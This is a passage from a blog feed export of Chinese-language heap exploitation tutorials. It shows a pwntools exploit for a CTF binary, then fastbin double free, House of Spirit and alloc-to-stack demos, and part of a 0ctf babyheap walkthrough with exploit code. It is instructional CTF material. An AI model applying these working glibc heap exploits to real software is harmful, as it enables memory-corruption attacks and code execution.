class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./magicheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./magicheap"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">"dada"</span>)  <span class="comment"># 2</span></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fd = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(elf.symbols[<span class="string">"magic"</span>] - <span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">"123456"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"4869"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Unsorted Bin Attack/">https://kabeor.github.io/堆溢出-Unsorted Bin Attack/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Unsorted-Bin-Attack&quot;&gt;&lt;a href=&quot;#堆溢出-Unsorted-Bin-Attack&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Unsorted Bin Attack&quot;&gt;&lt;/a&gt;堆溢出-Unsorted Bin 
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Fastbin Attack</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Fastbin%20Attack/"/>
    <id>https://kabeor.github.io/堆溢出-Fastbin Attack/</id>
    <published>2020-01-10T12:15:56.410Z</published>
    <updated>2020-01-15T07:45:41.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Fastbin-Attack"><a href="#堆溢出-Fastbin-Attack" class="headerlink" title="堆溢出-Fastbin Attack"></a>堆溢出-Fastbin Attack</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>fastbin使用单链表维护释放的堆块，由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">//进行释放</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///////释放前</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk3</span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f41</span> &lt;=== top chunk</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">///////释放后</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000602000</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== chunk3</span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000602040</span>  <span class="number">0x0000000000000000</span> -----------------&gt;<span class="number">0x602040</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f41</span> &lt;=== top chunk    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/////////chunk 3、2、1 构成了一个单链表</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x30</span>,ptr=<span class="number">0x602080</span>]</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x602040</span>, size=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x602000</span>, size=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br><span class="line">===&gt;Chunk(fd=<span class="number">0x000000</span>, size=<span class="number">0x40</span>, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 成功利用的条件：</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><p><strong>如果按顺序malloc了chunk0,chunk1，然后连续两次free(chunk0)则会被_int_free检测到从而导致“已放弃 (核心已转储)”，如果在 chunk0释放后，再释放 chunk1，这样 main_arena 就指向 chunk1 而不是 chunk0 了，此时再去释放 chunk0 就不再会被检测到。</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk0,*chunk1;</span><br><span class="line">    chunk0=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">+-----+------+</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">+-----+------+</span><br><span class="line">|   chunk0   +&lt;-----+</span><br><span class="line">+-----+------+      |</span><br><span class="line">      |             |</span><br><span class="line">      v             |</span><br><span class="line">+-----+------+      |</span><br><span class="line">|   chunk1   +------+</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 再进行一次 malloc() 分配到 chunk0，修改其 fd 指针</span><br><span class="line">//伪造一个 fake chunk，</span><br><span class="line">//往 chunk0 的数据段中写入 fake chunk 的地址，</span><br><span class="line">//就可以将 chunk0 的 fd 指向 fake chunk，</span><br><span class="line">//即将 fake chunk 添加进了 fastbin 链表中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       +------------+</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       +-------------+</span><br><span class="line">|      |   chunk0   +&lt;-----+</span><br><span class="line">|      +------------+      |</span><br><span class="line">|                          |</span><br><span class="line">|      +------------+      |</span><br><span class="line">+-----&gt;+   chunk1   +------+</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//再进行两次malloc()，</span><br><span class="line">//依次分配到 chunk1 和 chunk0，</span><br><span class="line"></span><br><span class="line">   +------------+</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       +-------------+</span><br><span class="line">+-----&gt;+   chunk0   |</span><br><span class="line">       +------------+</span><br><span class="line"></span><br><span class="line">       +------------+</span><br><span class="line">       |   chunk1   |</span><br><span class="line">       |  allocated |</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//由于之前将 chunk0 的 fd 指针指向了 fake chunk，</span><br><span class="line">//并且 chunk0 还呆在 fastbin 里，</span><br><span class="line">//所以第三次 malloc()时，</span><br><span class="line">//malloc()会将 chunk0 的 fd 赋给 fastbinY[i]，</span><br><span class="line">//此时只要再进行一次malloc()就可以分配到 fake chunk 了。</span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">|            |</span><br><span class="line">+-----+------+       +-------------+</span><br><span class="line">      |              |             |</span><br><span class="line">      +-------------&gt;+  fake chunk |</span><br><span class="line">                     |             |</span><br><span class="line">+------------+       +-------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk0   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk1   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p><code>the Malloc Maleficarum</code> 中的一种技术。</p><p>主要意思是我们想要控制的区域控制不了，但它前面和后面都可以控制，所以伪造好数据将它释放到fastbin里面，后面将该内存区域当做堆块申请出来，致使该区域被当做普通的内存使用，从而目标区域就变成了可控的了。</p><p>核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>需要绕过的检测:</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2*SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  how2heap git:(master) ./house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!</span><br><span class="line">malloc(0x30): 0x7ffd9bceaa60</span><br></pre></td></tr></table></figure><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><p>通过该技术可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>与 Alloc to stack 是完全相同的，只要满足目标地址存在合法的 size 域，就可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h2 id="例-2017-0ctf-babyheap"><a href="#例-2017-0ctf-babyheap" class="headerlink" title="例 2017 0ctf babyheap"></a>例 2017 0ctf babyheap</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Command: "</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX enabled</span></span><br><span class="line"><span class="comment">    PIE:      PIE enabled</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Fill</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = Read();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="number">24L</span>L * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = Read();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = sub_11B2(*(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);   <span class="comment">/////可读取任意长度</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>基本利用思路</p><ul><li>利用 unsorted bin 地址泄漏 libc 基地址。</li><li>利用 fastbin attack 将 chunk 分配到 malloc_hook 附近。</li></ul><h4 id="leak-libc基地址"><a href="#leak-libc基地址" class="headerlink" title="leak libc基地址"></a>leak libc基地址</h4><p>构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置才可以进行泄漏。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. leak libc base</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆当前布局</span><br><span class="line">pwndbg&gt; x/20xg 0x560ce09d8290</span><br><span class="line">0x560ce09d8290:0x00000000000000000x0000000000000021 ====&gt; chunk0</span><br><span class="line">0x560ce09d82a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x560ce09d82b0:0x00000000000000000x0000000000000021 ====&gt; chunk1(free)</span><br><span class="line">0x559499e682c0:0x00000000000000000x0000559499e68010</span><br><span class="line">0x560ce09d82d0:0x00000000000000000x0000000000000021 ====&gt; chunk2(free)</span><br><span class="line">0x559499e682e0:0x0000559499e682c00x0000559499e68010</span><br><span class="line">0x560ce09d82f0:0x00000000000000000x0000000000000021 ====&gt; chunk3</span><br><span class="line">0x560ce09d8300:0x00000000000000000x0000000000000000</span><br><span class="line">0x560ce09d8310:0x00000000000000000x0000000000000091 ====&gt; chunk4</span><br><span class="line">0x560ce09d8320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>此时使用 fill 覆盖 fastbin 头部 chunk 的 fd 值，将其改写成 small chunk 的地址，那么通过两次 alloc，先将 small chunk 放入 fastbin，再将其取出来，获得指向它的 index。要这么做必须绕过 malloc 的安全检查。</p><p>chunksize 的计算方法是 <code>victim-&gt;size &amp; ~(SIZE_BITS))</code>，而对应的 index 计算方法为 <code>(size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2</code>，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 <code>(size &gt;&gt; 4) - 2</code>，那么我们将 small chunk 的 size 域改写成 0x21 即可。</p><figure class="highlight python"><table><tr><td 